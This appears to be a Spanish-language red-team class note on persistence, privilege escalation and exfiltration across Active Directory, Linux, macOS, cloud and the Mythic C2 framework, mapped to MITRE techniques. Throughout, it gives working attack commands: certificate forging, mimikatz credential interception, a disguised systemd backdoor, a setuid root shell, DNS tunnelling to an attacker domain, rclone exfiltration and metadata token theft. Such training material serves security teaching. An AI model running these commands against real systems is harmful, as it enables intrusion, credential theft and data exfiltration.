# Clase 6

## Persistencia

Se setean callbacks, el servidor me llama a mí.

1. Persistencia en el Directorio Activo (On-Premise)

- Golder Certificate (ADCS Abuse)

	- Tecnica: T1558.004
	- Si se compromete la clave privada de la Entidad de Certificación un atacante puede forjar certificados para cualquier usuario
	- A diferencia del Golden Ticket de Kerberos, los certificados no caducan con el cambio de contraseña de krbtgt, mientras la CA sea valida, el atacante puede generar un PFX para el administrador de Dominio y autenticarse vía PKINIT
	
	```sh
	certipy forge -ca-pfx corp-ca.pfx -upn administrator@corp.local -subject "CN-Administrator"
	```
	
- Security Support Provider (SSP) Injection

	- Tecnica T1547.005
	- Los SSP son DLLs que Windows carga al iniciar para manejar la autenticación
	- Al registrar una DLL maliciosa en "HKLM\System\CurrentControlSet\Control\Lsa\" el proceso "lsass.exe" la cargará. Permitiendo interceptar cualquier credencial que pase por el sistema en texto plano.
	
	```sh
	privilege::debug
	misc::memssp
	```
	
2. Persistencia en el Endpoint (Evasión de EDR)

- COM Hijacking

	- Tecnica T1546.003
	- Windows usa el Component Object Model para la comunicacion entre procesos, muchas aplicaciones buscan objetos COM en el registro de usuario (HKCU) antes que en el del sistema (HKLM)
	- Si una aplicacion legitima intenta cargar un objeto COM que no existe, el atacante crea esa entrada en "KHCU\Software\Classes\CLSID\{GUID}\InprocServer32" apuntando a su DLL
	
- WMI Event Subscriptions
	
	- Tecnica T1546.003
	- WMI es una BD de administración de Windows profundamente integrada
	- Se crea un Event Filter, que detecta una condición, como el inicio de proceso o una hora especifica, un Event Consumer, la acción de ejecutar como una linea de comandos y un FilterToConsumerBinding
	
3. Persistencia en la Nube (Cloud/Hybrid)

- Azure AD: Federated Identity Credentials (FIC)

	- Tecnica T1098.001
	- Permite que una aplicación en Azure confie en un token emitido por un proveedor externo
	- El atacante añade una credencial federada a una aplicación existente que ya tiene permisos altos. Permitiendo generar tokens de acceso para esa aplicación sin necesidad de conocer su "Client Secret" o certificado, simplemente usando un token OIDC propio.
	
- GCP: Access Token Refresh de Service Accounts
	
	- Tecnica T1136.003
	- Los permisos de Service Account Key Creator permiten generar claves persistentes que no expiran a menos que se eliminen explicitamente
	- Si se compromete una identidad con estos permisos, se genera una llave privada para un Service Account con roles de administración
	
4. Persistencia a Nivel de Firmware/Hardware

- UEFI/BIOS Persistence
	
	- Tecnica T1542.001
	- Resiste formateos de disco duro y reinstalaciones de sistema operativo
	- Se inyecta código en el firmware UEFI, durante el arranque, el firmware modifica el kernel de Windows en memoria o deposita un binario en el disco antes de que el OS tome el control 
	- Es extremadamente dificil de implementar sin acceso físico o exploits específicos de BIOS, pero es el "Santo Grial" de la persistencia
	
5. Persistencia en Linux (Servidores y Workstations)

- Systemd Service Injection

	- ID MITRE T1543.002
	- systemd es el estandar moderno para la gestión de servicios en casi todas las distribuciones
	- Se crea un archivo .service en "/etc/systemd/system/" (requiere root) o en "/home/user/.config/systemd/user/" Al configurar Restart=always, el sistema operativo reiniciará el backdoor automaticamente si el proceso es finalizado
	
	```sh
	cat <<EOF > /etc/systemd/system/dbus-monitor.service 
	[Unit]
	Description=D-Bus System Message Bus monitor
	After=network.target
	
	[Service]
	Type=simple
	ExecStart=/usr/local/bin/backdoor_binary
	Restart=always
	RestartSec=10
	
	[Install]
	WantedBy=multi-user.target
	EOF
	
	systemctl enable dbus-monitor.service
	```
	
- PAM (Pluggable Authentication Modules) Backdoor

	- ID MITRE T1556.003
	- PAM gestiona la autenticación de SSH, sudo y login local
	- Se modifica el código fuente de pam_unix.so para aceptar una master password, permitiendo al atacante autenticarse como cualquier usuario del sistema sin cambiar las contraseñas reales
	
- MOTD (Message of the Day) Persistence
	
	- ID MITRE T1547.001
	- En distribuciones basadas en Debian/Ubuntu, los scripts en /etc/update-motd.d/ se ejecutan con privilegios de root cada vez que un usuario inicia sessión via SSH 
	- Basta con añadir una linea de ejecución a uno de los scripts existentes
	
6. Persistencia en macOS

- Launch Agents y Launch Daemons

	- ID MITRE T1543.001
	- Es el equivalente a los servicios de Windows en macOS
	- Se crea un archivo .plist que apunta al binario malicioso
	
	```sh
	launchctl load -w ~/Library/LaunchAgents/com.apple.sync.plist
	```
	
- Login Items

	- Se añaden aplicaciones a la lista de "Login Items" del usuario
	- A traves de AppleScript o modificando el archivo com.apple.loginitems.plist, menos discreto que un LaunchAgent, pero a menudo ignorado por usuarios promedio

- Emulación de Teclado vía AppleScript

	- Si ya se tienen permisos sobre una aplicación se pueden inyectar scripts que se ejecuten periodicamente para mantener el acceso o robar tokens de sesión de navegadores
	
7. Comandos con Herramientas Publicas (UNIX)

- Linux SSH Key Persistence
- macOS/Linux Cron Reverse Shell

8. Persistencia Fileless (Windows)

- Registry-Based PowerShell Hijacking

	- ID MITRE T1547.001 
	- En lugar de apuntar un binario, la clave de registro Run contiene un comando codificado en Base64 que invoca a PowerShell
	- Los antivirus suelen permitir que powershell.exe se ejecute. Si el script está codificado, el escaneo estático de la clave de registro no detectará firmas maliciosas
	
- WMI Event Subscriptions (Fileless) 

	- No ejecuta un archivo, sino directamente un comando de PowerShell que descarga y ejecuta el payload en memoria (IEX)
	- Los objetos WMI se almacenan en el archivo "C:\Windows\System32\wbem\Respository\OBJECTS.DATA"
	
9. Persistencia Fileless (Linux/UNIX)

- Enviroment Variable Hijacking 
	
	- Modificar el archivo "~/.bashrc" o "/etc/enviroment para incluir una variable LD_PRELOAD que apunte a una libreria compartida cargada desde una partición de memoria temporal como  /dev/shm
	- /dev/shm es un sistema de archivos volatil basado en RAM. Tras un apagado forense, el rastro desaparece, aunque la configuración en el archivo de entorno persiste para la proxima sesión
	
## Persistencia con C2 

1. Persistencia en Windows con el Agente Apollo (C#)

El agente apolo es el estandar para Windows en Mythic

- Persistencia vía Registro (RunKey)

Es la más común, Mythic la ejecuta de forma que el payload se descargue o se ejecute desde la ubicación "confiable"

	- Comando en Mythic: persist_runkey
	- Mecánica Técnica: El comando crea una entrada en "HKCU\Software\Microsoft\Windows\CurrentVersion\Run". Generalmente, se configura para ejecutar un comando de PowerShell que descarga el agente en memoria o ejecuta el binario lateralmente
	
	```sh
	persist_runkey -key "WindowsUpdate" -command "C:\Users\Public\Documents\agent.exe"
	```
	
- Persistencia vía Servicios 

	- Comando en Mythic: persist_services
	- Mecánica Técnica: Registra un nuevo servicio en el Service Control Manager y Apollo permite configurar el binPath para que apunte a tu ejecutable de Mythic
	- Los servicios se ejecutan bajo la cuenta SYSTEM, lo que garantiza que la persistencia no solo sea continua sino además root
	
2. Persistencia en Linux con el Agente Poseidon (Go) 

- Systemd Persistence

	- Mecánica Tecnica: Permite automatizar la creación de archivos de unidad de systemd 
	- Comando en Mythic: Bash 
		- Subes el binario de Poseidon a una ruta discreta: upload /tmp/.sys_monitor
		- Ejecutas un comando de shell para crear el servicio
		
	```sh
	shell echo "[Unit]\nDescription=System Monitor\n[Service]\nExecStart=/tmp/.sys_monitor\nRestart=always\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/sys_monitor.service 
	shell systemctl enable sys_monitor && systemctl start sys_monitor
	```
	
- Cron Persistence

	- Comando en Mythic: cron o shell crontab
	- Poseido puede interactuar con el crontab del usuario actual para programar la ejecución del agente cada vez que el sistema se reinicie (@reboot) o en intervalos regulares
	
3. Persistencia en macOS con Medusa/Poseidon 

- Técnica: persist_launchagent
- Crea un archivo .plist en ~/Library/LaunchAgents
- Los LaunchAgents son el metodo preferido porque no requieren privilegios de root para ejecutarse cuando el usuario inicia sesion y son menos monitoreados que los LaunchDaemons del sistema
- Evasión de TCC: Mythic permite firmar o empaquetar estos agentes en formatos .app para intentar evadir las alertas de Gatkeeper en versiones modernas de macOS 

4. Visualización del Flujo Técnico en Mythic 

Payload -> Profile -> C2 

- Generation: Creas un payload de tipo Service o Binary
- Staging: Lo subes al host comprometido
- Commanding: Envías el comando de persistencia desde la UI de Mythic
- Callback: Tras un reinicio, el agente se ejecuta y busca el C2 Profile (HTTP, DNS, gRPC) para volver a conectar

## Escalamiento y Exfiltración

1. Comandos de Escalamiento de privilegios

- Windows Token Impersonation (PrintSpoofer)

Esta técnica abusa del privilegio SeImpersonatePrivilege.

	- Herramienta: PrintSpoofer
	- Comando: 
	
	```sh
	.\PrintSpoofer64.exe -i -c cmd.exe 	
	```
	
	- Crea un Named Pipe y fuerza al servicio de spooler de impresión a conectarse a él, permitiendo la suplantación del token de SYSTEM

- AD Shadow Credentials (Whisker)

Para escalar privilegios si tienes permisos de escritura sobre un objeto de usuario/computadora

	- Herramienta: Whisker(C#) o PyWhisker
	- Comando: 
	
	```sh
	python3 pywhisker.py -d "dominio.local" -u "usuario_comprometido" -p "password" --target "usuario_objetivo" --action "add"
	```
	
	- Se usa el certificado generado para solicitar un TGT vía PKINIT
	
- Linux: Cap_setuid Abuse

	- Comando: 
	
	```sh
	getcap -r / 2>/dev/null
	
	python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
	```
	
2. Comandos de Exfiltración Avanzada

- DNS Tunneling (dnscat2)

	- Herramienta: dnscat2
	- Lado del atacante: Bash 
	
	```sh
	ruby ./dnscat2.rb --dns "domain=evil-domain.com"
	```
	
	- Los datos se encapsulan en registros txt o CNAME para evadir la inspección de trafico plano
	
Esto siempre va a ser detectado por un DLP si sus reglas lo aplican

- Cloud Exfiltration (Rclone hacia Azure/GCP)

	- Herramienta: Rclone 
	- Comando: Bash 
	
	```sh
	./rclone config
	
	./rclone copy /ruta/datos_sensibles/ remoto:bucket-redteam --bwlimit 100k --transfers 1
	```
	
- Esteganografía LSB (Steghide) 

Para ocultar archivos dentro de imagenes y subirlas a repositorios públicos o compartidos corporativos

	- Herramienta: Steghide
	- Comando: Bash 
	
	```sh
	steghide embed -cf imagen_corporativa.jpg -ef datos_exfiltrar.zip -p "password_secreto"
	```
	
3. Comandos de Cloud PrivEsc

- GCP: Impersonación de Service Account

Si tienes permiso iam.serviceAccounts.getAccessToken

	- Herramienta: gcloud SDK
	- Comando: 
	
	```sh
	gcloud auth print-access-token --impersonate-service-account=admin-sa@proyecto.iam.gserviceaccount.com 
	```
	
- Azure: Extracción de Tokens de Managed Identity

Si tienes ejecución de comandos en una VM o App Service

	- Comando: via cURL
	
	```sh
	curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token? 
	```
	
